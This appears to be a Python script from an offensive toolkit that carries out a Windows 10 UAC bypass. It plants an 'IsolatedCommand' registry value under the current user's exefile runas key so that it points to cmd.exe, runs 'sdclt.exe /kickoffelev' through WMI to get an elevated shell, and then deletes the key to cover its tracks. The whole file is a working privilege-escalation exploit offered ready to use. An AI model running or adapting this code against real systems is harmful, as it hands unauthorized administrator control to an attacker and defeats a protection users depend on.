"""
Works from: Windows 10 TH1 (10240)
Fixed in: Windows 10 RS4 (17025)
"""
from __future__ import print_function
import os
import wmi
import time
import _winreg
import win32con
from colorama import init, Fore
init(convert=True)

wmi = wmi.WMI()

payload = "c:\\windows\\system32\\cmd.exe"

def successBox():
	return (Fore.GREEN + '[+]' + Fore.RESET)
	
def errorBox():
	return (Fore.RED + '[-]' + Fore.RESET)

def infoBox():
	return (Fore.CYAN + '[!]' + Fore.RESET)	
	
def warningBox():
	return (Fore.YELLOW + '[!]' + Fore.RESET)

def sdclt_isolatedcommand():
	print(" {} sdclt_isolatedcommand: Attempting to create registry key".format(infoBox()))
	try:
		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
					os.path.join("Software\Classes\exefile\shell\runas\command"))					
		_winreg.SetValueEx(key,
				"IsolatedCommand",
				0,
				_winreg.REG_SZ,
				payload)
		_winreg.CloseKey(key)
		print(" {} sdclt_isolatedcommand: Registry key created".format(successBox()))
	except Exception as error:
		print(" {} sdclt_isolatedcommand: Unable to create key".format(errorBox()))
		return False

	print(" {} sdclt_isolatedcommand: Pausing for 5 seconds before executing".format(infoBox()))
	time.sleep(5)
	
	print(" {} sdclt_isolatedcommand: Attempting to create process".format(infoBox()))
	try:
		result = wmi.Win32_Process.Create(CommandLine="cmd.exe /c sdclt.exe /kickoffelev",
						ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=win32con.SW_SHOWNORMAL))
		if (result[1] == 0):
			print(" {} sdclt_isolatedcommand: Process started successfully".format(successBox()))
		else:
			print(" {} sdclt_isolatedcommand: Problem creating process".format(errorBox()))
	except Exception as error:
		print(" {} sdclt_isolatedcommand: Problem creating process".format(errorBox()))
		return False

	print(" {} sdclt_isolatedcommand: Pausing for 5 seconds before cleaning".format(infoBox()))
	time.sleep(5)
		
	try:
		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,
				os.path.join("Software\Classes\exefile\shell\runas\command"))
		print(" {} sdclt_isolatedcommand: Registry key was deleted".format(successBox()))
	except Exception as error:
		print(" {} sdclt_isolatedcommand: Unable to delete key".format(errorBox()))
		return False
